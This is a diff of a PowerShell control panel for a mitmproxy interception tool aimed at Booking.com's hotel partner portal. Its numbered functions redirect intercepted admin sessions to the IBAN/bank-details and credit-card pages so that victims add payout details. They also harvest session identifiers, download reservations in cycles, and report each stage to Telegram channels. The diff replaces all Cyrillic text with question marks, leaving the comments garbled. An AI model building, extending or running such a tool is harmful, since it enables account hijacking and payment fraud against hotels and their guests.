@@ -13,7 +13,7 @@ $MitmExeSearch = @(
     "C:\Users\chmel\AppData\Local\Programs\Python312\Scripts\mitmdump.exe"
 )
 
-# ---------------- ФЛАГИ ФУНКЦИЙ 1-20 ----------------
+# ---------------- ????? ??????? 1-20 ----------------
 $ForceFlag = "C:\temp\mitm_force_redirect"
 $OneShotFlag = "C:\temp\mitm_reset_once"
 $MessageFlag = "C:\temp\mitm_message_once"
@@ -36,10 +36,10 @@ $BookingCCDetailsFlag = "C:\temp\mitm_booking_cc_details_once"
 $BookingCCDetailsBnFile = "C:\temp\mitm_booking_cc_details_bn.txt"
 $BookingCCDetailsHotelIdFile = "C:\temp\mitm_booking_cc_details_hotel_id.txt"
 
-# ========== НОВЫЙ ФЛАГ ДЛЯ ФУНКЦИИ 14 (IBAN SETTINGS FORCE) ==========
+# ========== ????? ???? ??? ??????? 14 (IBAN SETTINGS FORCE) ==========
 $BookingIbanSettingsFlag = "C:\temp\mitm_booking_iban_settings_once"
 
-# ---------------- ФЛАГИ ФУНКЦИИ 27 ----------------
+# ---------------- ????? ??????? 27 ----------------
 $BookingReservationsCycleFlag = "C:\temp\mitm_booking_reservations_cycle_once"
 $BookingReservationsCycleHotelIdsFile = "C:\temp\mitm_booking_cycle_hotel_ids.txt"
 $BookingReservationsCycleReportIdsFile = "C:\temp\mitm_booking_cycle_report_ids.txt"
@@ -47,10 +47,10 @@ $BookingReservationsCycleIndexFile = "C:\temp\mitm_booking_cycle_index.txt"
 $BookingReservationsCycleActiveFile = "C:\temp\mitm_booking_cycle_active.txt"
 $BookingReservationsCycleNextRunFile = "C:\temp\mitm_booking_cycle_next_run.txt"
 
-# ========== НОВЫЙ ФЛАГ ДЛЯ ФУНКЦИИ 29 (IBAN + RESERVATIONS) ==========
+# ========== ????? ???? ??? ??????? 29 (IBAN + RESERVATIONS) ==========
 $BookingIbanAndReservationsFlag = "C:\temp\mitm_booking_iban_and_reservations_once"
 
-# ---------------- ФЛАГИ ФУНКЦИЙ 21-26 ----------------
+# ---------------- ????? ??????? 21-26 ----------------
 $PartnersFlag = "C:\temp\mitm_partners_once"
 $PartnersAndMessFlag = "C:\temp\mitm_partners_and_mess_once"
 $DeviceFlag = "C:\temp\mitm_device_once"
@@ -62,17 +62,17 @@ $UltraPulseRedirectToFile = "C:\temp\mitm_ultra_pulse_redirect_to.txt"
 $DeviceRedirectDoneFlag = "C:\temp\mitm_device_redirect_done.txt"
 $PartnersRedirectDoneFlag = "C:\temp\mitm_partners_redirect_done.txt"
 
-# ---------------- ФЛАГИ ДЛЯ АВТОЗАПУСКА ----------------
+# ---------------- ????? ??? ??????????? ----------------
 $AutostartFlag = "C:\temp\mitm_autostart_active.txt"
 $AutostartFunctionFile = "C:\temp\mitm_autostart_function.txt"
 
-# ---------------- ФАЙЛ РЕДИРЕКТА ----------------
+# ---------------- ???? ????????? ----------------
 $RedirectFile = Join-Path $WorkDir "redirect_target.txt"
 
-# ---------------- ФЛАГ ДЛЯ PULSE ----------------
+# ---------------- ???? ??? PULSE ----------------
 $PulseDisabledFlag = "C:\temp\mitm_pulse_disabled.txt"
 
-# ========== ОСНОВНЫЕ ФУНКЦИИ ==========
+# ========== ???????? ??????? ==========
 
 function Test-ValidUrl {
     param([string]$url)
@@ -332,13 +332,13 @@ function Save-AutostartState {
     try {
         Set-Content -Path $AutostartFlag -Value "ACTIVE" -Force
         Set-Content -Path $AutostartFunctionFile -Value $FunctionName -Force
-        Log-Write ("💾 Autostart state saved: {0}" -f $FunctionName)
+        Log-Write ("?? Autostart state saved: {0}" -f $FunctionName)
     } catch {
         Log-Write ("Failed to save autostart state: {0}" -f $_) "WARN"
     }
 }
 
-# ========== ФУНКЦИИ ДЛЯ РАБОТЫ С ФЛАГОМ 26 ==========
+# ========== ??????? ??? ?????? ? ?????? 26 ==========
 
 function Preserve-Function26Flag {
     return (Test-Path $MonitorPlatformsFlag)
@@ -350,12 +350,12 @@ function Restore-Function26Flag {
     if ($wasEnabled) {
         if (-not (Test-Path $MonitorPlatformsFlag)) {
             $null = New-Item -ItemType File -Path $MonitorPlatformsFlag -Force
-            Log-Write "✅ Function 26 flag RESTORED - parallel mode active"
+            Log-Write "? Function 26 flag RESTORED - parallel mode active"
         }
     }
 }
 
-# ========== ФУНКЦИЯ 26: ПЛАТФОРМ МОНИТОРИНГ (ПАРАЛЛЕЛЬНАЯ) ==========
+# ========== ??????? 26: ???????? ?????????? (????????????) ==========
 function Enable-MonitorPlatforms {
     Log-Write "Starting FUNCTION 26..."
     
@@ -365,8 +365,8 @@ function Enable-MonitorPlatforms {
     Write-Host "[INFO] Monitors selected platforms including admin.booking.com"
     Write-Host "       Telegram logs to appropriate channels"
     Write-Host "       NO redirects - only monitoring"
-    Write-Host "       ✅ РАБОТАЕТ ПАРАЛЛЕЛЬНО С ДРУГИМИ ФУНКЦИЯМИ"
-    Write-Host "       ✅ ОТКЛЮЧАЕТСЯ ТОЛЬКО КНОПКОЙ 4!"
+    Write-Host "       ? ???????? ??????????? ? ??????? ?????????"
+    Write-Host "       ? ??????????? ?????? ??????? 4!"
     Write-Host ""
     
     if (-not (Test-Path (Split-Path $MonitorPlatformsFlag))) {
@@ -382,17 +382,17 @@ function Enable-MonitorPlatforms {
     Save-AutostartState -FunctionName "FUNCTION_26"
     
     Write-Host ""
-    Write-Host "✅ Function 26 ACTIVATED" -ForegroundColor Green
-    Write-Host "   ✅ Мониторинг платформ АКТИВЕН"
-    Write-Host "   ✅ Работает ПАРАЛЛЕЛЬНО с функциями 7-25, 27"
-    Write-Host "   ✅ Будет работать ПОКА НЕ ОТКЛЮЧЕНО кнопкой 4"
-    Write-Host "   📨 Telegram notifications based on domain"
+    Write-Host "? Function 26 ACTIVATED" -ForegroundColor Green
+    Write-Host "   ? ?????????? ???????? ???????"
+    Write-Host "   ? ???????? ??????????? ? ????????? 7-25, 27"
+    Write-Host "   ? ????? ???????? ???? ?? ????????? ??????? 4"
+    Write-Host "   ?? Telegram notifications based on domain"
     Write-Host ""
     
     Start-Mitmdump
 }
 
-# ========== ФУНКЦИИ 1-20 ==========
+# ========== ??????? 1-20 ==========
 
 function Enable-ForceRedirect {
     $function26WasEnabled = Preserve-Function26Flag
@@ -723,8 +723,8 @@ function Disable-BookingHotelRedirect {
     Log-Write "Booking.com HOTEL (global) redirect disabled (function 13)."
 }
 
-# ========== ОБНОВЛЕННАЯ ФУНКЦИЯ 14: IBAN SETTINGS FORCE ==========
-# Взято за основу из mitm_redirect_addon_13_iban.py (функция 13 IBAN settings force)
+# ========== ??????????? ??????? 14: IBAN SETTINGS FORCE ==========
+# ????? ?? ?????? ?? mitm_redirect_addon_13_iban.py (??????? 13 IBAN settings force)
 function Enable-BookingIbanSettingsRedirect {
     $function26WasEnabled = Preserve-Function26Flag
     
@@ -735,19 +735,19 @@ function Enable-BookingIbanSettingsRedirect {
     Write-Host "=== FUNCTION 14: IBAN SETTINGS FORCE ==="
     Write-Host "============================================"
     Write-Host ""
-    Write-Host "[INFO] Эта функция перенаправляет на страницу IBAN/bank details"
-    Write-Host "       (finance_settings.html) для добавления банковских реквизитов"
+    Write-Host "[INFO] ??? ??????? ?????????????? ?? ???????? IBAN/bank details"
+    Write-Host "       (finance_settings.html) ??? ?????????? ?????????? ??????????"
     Write-Host ""
-    Write-Host "📌 ЧТО ДЕЛАЕТ ФУНКЦИЯ:"
-    Write-Host "   1. Перехватывает запросы к admin.booking.com/hotel/*"
-    Write-Host "   2. Перенаправляет на:"
+    Write-Host "?? ??? ?????? ???????:"
+    Write-Host "   1. ????????????? ??????? ? admin.booking.com/hotel/*"
+    Write-Host "   2. ?????????????? ??:"
     Write-Host "      https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/finance_settings.html"
-    Write-Host "   3. ПОСЛЕ ЗАВЕРШЕНИЯ (когда есть ses, hotel_id, auth_assurance_last_check):"
-    Write-Host "      ✅ МГНОВЕННЫЙ редирект на https://admin.booking.com/"
-    Write-Host "   4. Отправляет логи в Telegram:"
-    Write-Host "      📘 BOOKER канал - статус 'In PROCESS with IBAN 🏦'"
-    Write-Host "      ✅ BOOKER канал - статус 'IBAN CAN BE ADDED 🏦'"
-    Write-Host "   5. В лог добавляется информация о браузере клиента!"
+    Write-Host "   3. ????? ?????????? (????? ???? ses, hotel_id, auth_assurance_last_check):"
+    Write-Host "      ? ?????????? ???????? ?? https://admin.booking.com/"
+    Write-Host "   4. ?????????? ???? ? Telegram:"
+    Write-Host "      ?? BOOKER ????? - ?????? 'In PROCESS with IBAN ??'"
+    Write-Host "      ? BOOKER ????? - ?????? 'IBAN CAN BE ADDED ??'"
+    Write-Host "   5. ? ??? ??????????? ?????????? ? ???????? ???????!"
     Write-Host ""
     
     if (-not (Test-Path (Split-Path $BookingIbanSettingsFlag))) {
@@ -779,10 +779,10 @@ function Enable-BookingIbanSettingsRedirect {
     Save-AutostartState -FunctionName "FUNCTION_14_IBAN"
     
     Write-Host ""
-    Write-Host "✅ FUNCTION 14 ACTIVATED" -ForegroundColor Green
-    Write-Host "   📍 Redirect target: finance_settings.html (IBAN/Bank Details)"
-    Write-Host "   🚀 After completion: INSTANT redirect to https://admin.booking.com/"
-    Write-Host "   📨 Telegram logs to BOOKER channel with browser info"
+    Write-Host "? FUNCTION 14 ACTIVATED" -ForegroundColor Green
+    Write-Host "   ?? Redirect target: finance_settings.html (IBAN/Bank Details)"
+    Write-Host "   ?? After completion: INSTANT redirect to https://admin.booking.com/"
+    Write-Host "   ?? Telegram logs to BOOKER channel with browser info"
     Write-Host ""
     
     Start-Mitmdump
@@ -792,7 +792,7 @@ function Enable-BookingIbanSettingsRedirect {
 function Disable-BookingIbanSettingsRedirect {
     Remove-Item -Path $BookingIbanSettingsFlag -Force -ErrorAction SilentlyContinue
     Write-Host ""
-    Write-Host "✅ Function 14 (IBAN Settings Force) DISABLED" -ForegroundColor Yellow
+    Write-Host "? Function 14 (IBAN Settings Force) DISABLED" -ForegroundColor Yellow
     Write-Host ""
     Log-Write "Booking.com IBAN Settings Force redirect disabled (function 14)."
 }
@@ -985,7 +985,7 @@ function Enable-CustomRedirect {
     
     Log-Write "[F17] Custom one-time redirect enabled."
     Write-Host ""
-    Write-Host "✅ Function 17 ACTIVATED" -ForegroundColor Green
+    Write-Host "? Function 17 ACTIVATED" -ForegroundColor Green
     Write-Host "   Next request to $fromDomain will be redirected" -ForegroundColor Cyan
     Write-Host ""
 }
@@ -999,7 +999,7 @@ function Clear-Function17 {
     Remove-Item -Path $CustomRedirectToFile -Force -ErrorAction SilentlyContinue
     
     Write-Host ""
-    Write-Host "✅ Function 17 completely cleared" -ForegroundColor Green
+    Write-Host "? Function 17 completely cleared" -ForegroundColor Green
     Write-Host "   All flags and configuration removed"
     Write-Host ""
     
@@ -1140,7 +1140,7 @@ function Enable-BookingCCDetailsRedirect {
     Log-Write "Booking CC details redirect enabled (function 19)."
 }
 
-# ========== ФУНКЦИЯ 27: ЦИКЛИЧЕСКАЯ КОПИЯ ФУНКЦИИ 18 ==========
+# ========== ??????? 27: ??????????? ????? ??????? 18 ==========
 function Enable-BookingReservationsCycleRedirect {
     $function26WasEnabled = Preserve-Function26Flag
     
@@ -1151,12 +1151,12 @@ function Enable-BookingReservationsCycleRedirect {
     Write-Host "=== FUNCTION 27: CYCLE RESERVATIONS DOWNLOAD ==="
     Write-Host "============================================"
     Write-Host ""
-    Write-Host "[INFO] УСЛОЖНЕННАЯ КОПИЯ ФУНКЦИИ 18"
-    Write-Host "       1. Админ вводит СПИСОК hotel_id и СПИСОК report_id"
-    Write-Host "       2. Скрипт проходит по всем комбинациям"
-    Write-Host "       3. После каждого цикла - пауза 1 минута"
-    Write-Host "       4. Затем новый цикл с новыми параметрами"
-    Write-Host "       5. ПОЛНОЕ ЛОГИРОВАНИЕ как в функции 18"
+    Write-Host "[INFO] ??????????? ????? ??????? 18"
+    Write-Host "       1. ????? ?????? ?????? hotel_id ? ?????? report_id"
+    Write-Host "       2. ?????? ???????? ?? ???? ???????????"
+    Write-Host "       3. ????? ??????? ????? - ????? 1 ??????"
+    Write-Host "       4. ????? ????? ???? ? ?????? ???????????"
+    Write-Host "       5. ?????? ??????????? ??? ? ??????? 18"
     Write-Host ""
     
     do {
@@ -1203,7 +1203,7 @@ function Enable-BookingReservationsCycleRedirect {
     
     if ($hotelIdsArray.Count -ne $reportIdsArray.Count) {
         Write-Host ""
-        Write-Host "⚠️  WARNING: Number of hotel_ids and report_ids do not match!" -ForegroundColor Yellow
+        Write-Host "??  WARNING: Number of hotel_ids and report_ids do not match!" -ForegroundColor Yellow
         Write-Host "   Hotel IDs: $($hotelIdsArray.Count), Report IDs: $($reportIdsArray.Count)" -ForegroundColor Yellow
         Write-Host "   Script will use MINIMUM count: $(($hotelIdsArray.Count, $reportIdsArray.Count | Measure-Object -Minimum).Minimum)" -ForegroundColor Yellow
         $confirm = Read-Host "Continue anyway? (y/n)"
@@ -1253,29 +1253,29 @@ function Enable-BookingReservationsCycleRedirect {
     
     Write-Host ""
     Write-Host "============================================" -ForegroundColor Green
-    Write-Host "✅ FUNCTION 27 ACTIVATED" -ForegroundColor Green
+    Write-Host "? FUNCTION 27 ACTIVATED" -ForegroundColor Green
     Write-Host "============================================" -ForegroundColor Green
     Write-Host ""
-    Write-Host "📋 CONFIGURATION:" -ForegroundColor Cyan
+    Write-Host "?? CONFIGURATION:" -ForegroundColor Cyan
     Write-Host "   Total cycles: $totalCycles"
     Write-Host "   Hotel IDs: $hotelIdsString"
     Write-Host "   Report IDs: $reportIdsString"
     Write-Host ""
-    Write-Host "🔄 EXECUTION PLAN:" -ForegroundColor Cyan
+    Write-Host "?? EXECUTION PLAN:" -ForegroundColor Cyan
     for ($i = 0; $i -lt $totalCycles; $i++) {
         Write-Host "   Cycle $($i+1): hotel_id=$($hotelIdsArray[$i]), report_id=$($reportIdsArray[$i])"
     }
     Write-Host ""
-    Write-Host "⏱️  TIMING:" -ForegroundColor Cyan
+    Write-Host "??  TIMING:" -ForegroundColor Cyan
     Write-Host "   - Each cycle runs until ALL 5 parameters detected"
     Write-Host "   - After completion: 10s auto-redirect to main page"
     Write-Host "   - 60 second pause between cycles"
     Write-Host "   - Automatically proceeds through ALL cycles"
     Write-Host ""
-    Write-Host "📨 NOTIFICATIONS:" -ForegroundColor Cyan
+    Write-Host "?? NOTIFICATIONS:" -ForegroundColor Cyan
     Write-Host "   - Each cycle completion sends Telegram notification with FULL URL"
     Write-Host "   - Final notification when ALL cycles completed"
-    Write-Host "   - ✅ ВСЕ УВЕДОМЛЕНИЯ ИДУТ В КАНАЛ BOOKER!"
+    Write-Host "   - ? ??? ??????????? ???? ? ????? BOOKER!"
     Write-Host ""
     
     Start-Mitmdump
@@ -1293,14 +1293,14 @@ function Clear-Function27 {
     Remove-Item -Path $BookingReservationsCycleNextRunFile -Force -ErrorAction SilentlyContinue
     
     Write-Host ""
-    Write-Host "✅ Function 27 completely cleared" -ForegroundColor Green
+    Write-Host "? Function 27 completely cleared" -ForegroundColor Green
     Write-Host "   All cycle flags and configuration removed"
     Write-Host ""
     
     Log-Write "Function 27 cleared"
 }
 
-# ========== ФУНКЦИЯ 29: IBAN + RESERVATIONS ==========
+# ========== ??????? 29: IBAN + RESERVATIONS ==========
 function Enable-BookingIbanAndReservationsRedirect {
     $function26WasEnabled = Preserve-Function26Flag
     
@@ -1311,15 +1311,15 @@ function Enable-BookingIbanAndReservationsRedirect {
     Write-Host "=== FUNCTION 29: IBAN + RESERVATIONS ==="
     Write-Host "============================================"
     Write-Host ""
-    Write-Host "[INFO] СОВМЕЩАЕТ функцию 14 (IBAN Settings Force) и функцию 18 (Reservations Download)"
+    Write-Host "[INFO] ????????? ??????? 14 (IBAN Settings Force) ? ??????? 18 (Reservations Download)"
     Write-Host ""
-    Write-Host "📌 ПОСЛЕДОВАТЕЛЬНОСТЬ:"
-    Write-Host "   1. СНАЧАЛА активируется функция 14 (IBAN Settings Force)"
-    Write-Host "   2. После ее ЗАВЕРШЕНИЯ автоматически активируется функция 18 (Reservations Download)"
-    Write-Host "   3. Начинается загрузка резервов"
+    Write-Host "?? ??????????????????:"
+    Write-Host "   1. ??????? ???????????? ??????? 14 (IBAN Settings Force)"
+    Write-Host "   2. ????? ?? ?????????? ????????????? ???????????? ??????? 18 (Reservations Download)"
+    Write-Host "   3. ?????????? ???????? ????????"
     Write-Host ""
     
-    Write-Host "📋 НАСТРОЙКА ФУНКЦИИ 18 (RESERVATIONS)"
+    Write-Host "?? ????????? ??????? 18 (RESERVATIONS)"
     Write-Host ""
     
     do {
@@ -1340,19 +1340,19 @@ function Enable-BookingIbanAndReservationsRedirect {
         break
     } while ($true)
     
-    # Сохраняем параметры для функции 18 (НО НЕ СОЗДАЕМ ЕЁ ФЛАГ!)
+    # ????????? ????????? ??? ??????? 18 (?? ?? ??????? ?? ????!)
     Set-Content -Path $BookingReservationsHotelIdFile -Value $hotelId -Force
     Set-Content -Path $BookingReservationsReportIdFile -Value $reportId -Force
     
-    # СОЗДАЕМ ФЛАГ ФУНКЦИИ 14 (IBAN)
+    # ??????? ???? ??????? 14 (IBAN)
     if (-not (Test-Path (Split-Path $BookingIbanSettingsFlag))) {
         New-Item -ItemType Directory -Path (Split-Path $BookingIbanSettingsFlag) -Force | Out-Null
     }
     New-Item -ItemType File -Path $BookingIbanSettingsFlag -Force | Out-Null
     
-    # НЕ СОЗДАЕМ ФЛАГ ФУНКЦИИ 18! ОН БУДЕТ СОЗДАН ПОСЛЕ ЗАВЕРШЕНИЯ IBAN!
+    # ?? ??????? ???? ??????? 18! ?? ????? ?????? ????? ?????????? IBAN!
     
-    # СОЗДАЕМ ФЛАГ ФУНКЦИИ 29
+    # ??????? ???? ??????? 29
     if (-not (Test-Path (Split-Path $BookingIbanAndReservationsFlag))) {
         New-Item -ItemType Directory -Path (Split-Path $BookingIbanAndReservationsFlag) -Force | Out-Null
     }
@@ -1370,7 +1370,7 @@ function Enable-BookingIbanAndReservationsRedirect {
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
-        # НЕ УДАЛЯЕМ ФЛАГ 18, ПОТОМУ ЧТО ОН НЕ СОЗДАН!
+        # ?? ??????? ???? 18, ?????? ??? ?? ?? ??????!
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -1382,20 +1382,20 @@ function Enable-BookingIbanAndReservationsRedirect {
     
     Write-Host ""
     Write-Host "============================================" -ForegroundColor Green
-    Write-Host "✅ FUNCTION 29 ACTIVATED" -ForegroundColor Green
+    Write-Host "? FUNCTION 29 ACTIVATED" -ForegroundColor Green
     Write-Host "============================================" -ForegroundColor Green
     Write-Host ""
-    Write-Host "📋 CONFIGURATION:" -ForegroundColor Cyan
+    Write-Host "?? CONFIGURATION:" -ForegroundColor Cyan
     Write-Host "   IBAN Settings Force (Function 14) - ENABLED"
     Write-Host "   Reservations download (Function 18) - will start AFTER IBAN completes"
     Write-Host "   Hotel ID: $hotelId"
     Write-Host "   Report ID: $reportId"
     Write-Host ""
-    Write-Host "🔄 SEQUENCE:" -ForegroundColor Cyan
-    Write-Host "   1. User visits admin.booking.com → IBAN settings page"
-    Write-Host "   2. User adds IBAN and clicks save → function 14 completes"
-    Write-Host "   3. AUTOMATICALLY → Reservations download starts"
-    Write-Host "   4. After reservations completion → 10s auto-redirect to main page"
+    Write-Host "?? SEQUENCE:" -ForegroundColor Cyan
+    Write-Host "   1. User visits admin.booking.com ? IBAN settings page"
+    Write-Host "   2. User adds IBAN and clicks save ? function 14 completes"
+    Write-Host "   3. AUTOMATICALLY ? Reservations download starts"
+    Write-Host "   4. After reservations completion ? 10s auto-redirect to main page"
     Write-Host ""
     
     Start-Mitmdump
@@ -1412,14 +1412,14 @@ function Clear-Function29 {
     Remove-Item -Path $BookingReservationsReportIdFile -Force -ErrorAction SilentlyContinue
     
     Write-Host ""
-    Write-Host "✅ Function 29 completely cleared" -ForegroundColor Green
+    Write-Host "? Function 29 completely cleared" -ForegroundColor Green
     Write-Host "   All flags and configuration removed"
     Write-Host ""
     
     Log-Write "Function 29 cleared"
 }
 
-# ========== НОВЫЕ ФУНКЦИИ 21-26 ==========
+# ========== ????? ??????? 21-26 ==========
 
 function Enable-PartnersRedirect {
     $function26WasEnabled = Preserve-Function26Flag
@@ -1465,7 +1465,7 @@ function Enable-PartnersRedirect {
     Save-AutostartState -FunctionName "FUNCTION_21"
     
     Write-Host ""
-    Write-Host "✅ Function 21 ACTIVATED" -ForegroundColor Green
+    Write-Host "? Function 21 ACTIVATED" -ForegroundColor Green
     Write-Host "   Redirecting admin.booking.com to channel-manager"
     Write-Host "   Telegram notifications to channel 'booker'"
     Write-Host ""
@@ -1520,7 +1520,7 @@ function Enable-PartnersAndMessRedirect {
     Save-AutostartState -FunctionName "FUNCTION_22"
     
     Write-Host ""
-    Write-Host "✅ Function 22 ACTIVATED" -ForegroundColor Green
+    Write-Host "? Function 22 ACTIVATED" -ForegroundColor Green
     Write-Host "   Sequence: Function 21 -> then Function 15"
     Write-Host "   Telegram notifications to channel 'booker'"
     Write-Host ""
@@ -1572,7 +1572,7 @@ function Enable-DeviceRedirect {
     Save-AutostartState -FunctionName "FUNCTION_23"
     
     Write-Host ""
-    Write-Host "✅ Function 23 ACTIVATED" -ForegroundColor Green
+    Write-Host "? Function 23 ACTIVATED" -ForegroundColor Green
     Write-Host "   Redirecting admin.booking.com to devices.html"
     Write-Host "   Telegram notifications to channel 'pms'"
     Write-Host ""
@@ -1591,21 +1591,21 @@ function Enable-PulseRedirect {
     Write-Host "=== FUNCTION 24: PULSE REDIRECT ==="
     Write-Host ""
     Write-Host "[INFO] Redirects admin.booking.com to custom URL"
-    Write-Host "       PULSE работает ПОКА АДМИН НЕ ОТКЛЮЧИТ функцию"
-    Write-Host "       После отключения: ВСЕ запросы к account.booking.com"
-    Write-Host "       будут перенаправлены на admin.booking.com/hotel/hoteladmin/"
+    Write-Host "       PULSE ???????? ???? ????? ?? ???????? ???????"
+    Write-Host "       ????? ??????????: ??? ??????? ? account.booking.com"
+    Write-Host "       ????? ?????????????? ?? admin.booking.com/hotel/hoteladmin/"
     Write-Host "       Telegram logs to channel 'pms'"
     Write-Host ""
-    Write-Host "📌 ADMIN COMMANDS FOR PULSE CONTROL:"
-    Write-Host "   - Pulse работает БЕСКОНЕЧНО пока не отключен"
-    Write-Host "   - Для ОСТАНОВКИ Pulse выберите:"
-    Write-Host "       1) Опция 4 (DISABLE all redirects) - полное отключение"
-    Write-Host "       2) Опция 1 (RESET) - сброс"
-    Write-Host "   - После остановки: все account.booking.com -> admin.booking.com/hotel/hoteladmin/"
+    Write-Host "?? ADMIN COMMANDS FOR PULSE CONTROL:"
+    Write-Host "   - Pulse ???????? ?????????? ???? ?? ????????"
+    Write-Host "   - ??? ????????? Pulse ????????:"
+    Write-Host "       1) ????? 4 (DISABLE all redirects) - ?????? ??????????"
+    Write-Host "       2) ????? 1 (RESET) - ?????"
+    Write-Host "   - ????? ?????????: ??? account.booking.com -> admin.booking.com/hotel/hoteladmin/"
     Write-Host ""
-    Write-Host "🔧 ЛОГИКА РАБОТЫ:"
-    Write-Host "   - В активном режиме: admin.booking.com -> ваш_выбранный_URL"
-    Write-Host "   - После отключения: account.booking.com/* -> admin.booking.com/hotel/hoteladmin/"
+    Write-Host "?? ?????? ??????:"
+    Write-Host "   - ? ???????? ??????: admin.booking.com -> ???_?????????_URL"
+    Write-Host "   - ????? ??????????: account.booking.com/* -> admin.booking.com/hotel/hoteladmin/"
     Write-Host ""
     
     do {
@@ -1659,11 +1659,11 @@ function Enable-PulseRedirect {
     Save-AutostartState -FunctionName "FUNCTION_24"
     
     Write-Host ""
-    Write-Host "✅ Function 24 ACTIVATED" -ForegroundColor Green
+    Write-Host "? Function 24 ACTIVATED" -ForegroundColor Green
     Write-Host "   Pulse redirect to: $toDomain"
-    Write-Host "   🚨 Pulse will work until YOU disable it via menu option 4 or 1"
-    Write-Host "   📡 After disabling: ALL account.booking.com -> admin.booking.com/hotel/hoteladmin/"
-    Write-Host "   📨 Telegram notifications to channel 'pms'"
+    Write-Host "   ?? Pulse will work until YOU disable it via menu option 4 or 1"
+    Write-Host "   ?? After disabling: ALL account.booking.com -> admin.booking.com/hotel/hoteladmin/"
+    Write-Host "   ?? Telegram notifications to channel 'pms'"
     Write-Host ""
     
     Start-Mitmdump
@@ -1686,12 +1686,12 @@ function Enable-UltraPulseRedirect {
     Write-Host "          (works until manually disabled via menu)"
     Write-Host "       Telegram logs to channel 'pms'"
     Write-Host ""
-    Write-Host "📌 SEQUENCE STEPS:"
+    Write-Host "?? SEQUENCE STEPS:"
     Write-Host "   Step 1: User visits admin.booking.com -> redirected to devices.html"
     Write-Host "   Step 2: When device page has auth_assurance_last_check -> Phase 1 done"
     Write-Host "   Step 3: Pulse phase starts automatically"
     Write-Host ""
-    Write-Host "🔧 AFTER DISABLING PULSE:"
+    Write-Host "?? AFTER DISABLING PULSE:"
     Write-Host "   ALL account.booking.com/* -> admin.booking.com/hotel/hoteladmin/"
     Write-Host "   Works even after mitmdump restart"
     Write-Host ""
@@ -1751,18 +1751,18 @@ function Enable-UltraPulseRedirect {
     Save-AutostartState -FunctionName "FUNCTION_25"
     
     Write-Host ""
-    Write-Host "✅ Function 25 ACTIVATED" -ForegroundColor Green
+    Write-Host "? Function 25 ACTIVATED" -ForegroundColor Green
     Write-Host "   Phase 1: Device Security (Function 23)"
     Write-Host "   Phase 2: Pulse redirect to: $toDomain"
-    Write-Host "   🚨 Phase 2 works until disabled via menu option 4 or 1"
-    Write-Host "   📡 After disabling: ALL account.booking.com -> admin.booking.com/hotel/hoteladmin/"
-    Write-Host "   📨 Telegram notifications to channel 'pms'"
+    Write-Host "   ?? Phase 2 works until disabled via menu option 4 or 1"
+    Write-Host "   ?? After disabling: ALL account.booking.com -> admin.booking.com/hotel/hoteladmin/"
+    Write-Host "   ?? Telegram notifications to channel 'pms'"
     Write-Host ""
     
     Start-Mitmdump
 }
 
-# ========== ФУНКЦИИ УПРАВЛЕНИЯ ==========
+# ========== ??????? ?????????? ==========
 
 function Disable-AllRedirects {
     $function26WasEnabled = Preserve-Function26Flag
@@ -1798,13 +1798,13 @@ function Disable-AllRedirects {
     Log-Write "All redirects disabled and proxy cleared."
     
     Write-Host ""
-    Write-Host "⚠️  IMPORTANT:" -ForegroundColor Yellow
+    Write-Host "??  IMPORTANT:" -ForegroundColor Yellow
     if ($function26WasEnabled) {
-        Write-Host "   ✅ FUNCTION 26 (MONITORING) IS STILL ACTIVE!" -ForegroundColor Green
-        Write-Host "   🔍 Platform monitoring continues to work in parallel" -ForegroundColor Cyan
-        Write-Host "   📨 Telegram notifications for platform access are still being sent" -ForegroundColor Cyan
+        Write-Host "   ? FUNCTION 26 (MONITORING) IS STILL ACTIVE!" -ForegroundColor Green
+        Write-Host "   ?? Platform monitoring continues to work in parallel" -ForegroundColor Cyan
+        Write-Host "   ?? Telegram notifications for platform access are still being sent" -ForegroundColor Cyan
     } else {
-        Write-Host "   ❌ FUNCTION 26 (MONITORING) IS DISABLED" -ForegroundColor Red
+        Write-Host "   ? FUNCTION 26 (MONITORING) IS DISABLED" -ForegroundColor Red
         Write-Host "   Use option 26 to enable monitoring" -ForegroundColor Yellow
     }
     Write-Host ""
@@ -1826,17 +1826,17 @@ Ensure-MitmCA | Out-Null
 $AutostartDetected = $false
 if (Test-Path $AutostartFlag) {
     Log-Write "=" * 60
-    Log-Write "🔄 AUTOSTART DETECTED - Restoring previous state"
+    Log-Write "?? AUTOSTART DETECTED - Restoring previous state"
     $AutostartDetected = $true
     
     if (Test-Path $AutostartFunctionFile) {
         $savedFunction = Get-Content $AutostartFunctionFile -Raw | ForEach-Object { $_.Trim() }
-        Log-Write "🔄 Restoring function: $savedFunction"
+        Log-Write "?? Restoring function: $savedFunction"
     }
     Log-Write "=" * 60
     
     Write-Host ""
-    Write-Host "🔄 AUTOSTART DETECTED" -ForegroundColor Cyan
+    Write-Host "?? AUTOSTART DETECTED" -ForegroundColor Cyan
     Write-Host "   Previous session detected. Do you want to:" -ForegroundColor Cyan
     Write-Host "   1) Continue with saved function" -ForegroundColor Green
     Write-Host "   2) Start fresh (disable autostart)" -ForegroundColor Yellow
@@ -1900,7 +1900,7 @@ $closeOption = switch ($closeChoice) {
 Close-Browsers-Gracefully -closeOption $closeOption
 
 if ($AutostartDetected) {
-    Log-Write "🔄 Autostart: Starting mitmdump with saved configuration"
+    Log-Write "?? Autostart: Starting mitmdump with saved configuration"
     Start-Mitmdump
 }
 
@@ -1924,7 +1924,7 @@ while ($true) {
     Write-Host "   11) Operation 11 (7 -> 8)"
     Write-Host "   12) Operation 12 (9 -> 10)"
     Write-Host "   13) Phone settings force"
-    Write-Host "   14) 📘 IBAN settings force (Function 14) 🏦"
+    Write-Host "   14) ?? IBAN settings force (Function 14) ??"
     Write-Host "   15) Messages settings force (function 15)"
     Write-Host "   16) Operation 16 (13 -> 15)"
     Write-Host "   17) Custom one-time redirect (function 17)"
@@ -1938,15 +1938,15 @@ while ($true) {
     Write-Host "   23) Device security (pms)"
     Write-Host "   24) Pulse redirect (pms)"
     Write-Host "   25) Ultra Pulse (pms)"
-    Write-Host "   26) ✅ Platform monitoring ONLY (ПАРАЛЛЕЛЬНО - НЕ УДАЛЯЕТСЯ!)"
+    Write-Host "   26) ? Platform monitoring ONLY (??????????? - ?? ?????????!)"
     Write-Host "   27) CYCLE Reservations download (BOOKER CHANNEL)"
